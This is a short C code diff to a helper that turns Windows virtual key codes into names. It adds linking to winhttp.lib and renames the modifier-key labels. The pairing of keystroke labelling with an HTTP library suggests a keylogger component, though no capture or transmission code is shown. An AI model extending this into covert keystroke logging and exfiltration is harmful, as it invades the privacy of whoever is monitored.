@@ -1,4 +1,5 @@
 #include "helperlib.h"
+#pragma comment(lib, "winhttp.lib")
 
 STRSAFE_LPSTR vkCodeToString(INT vkCode) {
     switch (vkCode)
@@ -16,11 +17,11 @@ STRSAFE_LPSTR vkCodeToString(INT vkCode) {
     case VK_RETURN:
         return (STRSAFE_LPSTR)"Enter";
     case VK_SHIFT:
-        return (STRSAFE_LPSTR)"Shift";
+        return (STRSAFE_LPSTR)"Shift-INVLD";
     case VK_CONTROL:
-        return (STRSAFE_LPSTR)"CTRL";
+        return (STRSAFE_LPSTR)"CTRL-INVLD";
     case VK_MENU:
-        return (STRSAFE_LPSTR)"ALT";
+        return (STRSAFE_LPSTR)"ALT-INVLD";
     case VK_PAUSE:
         return (STRSAFE_LPSTR)"Pause";
     case VK_CAPITAL:
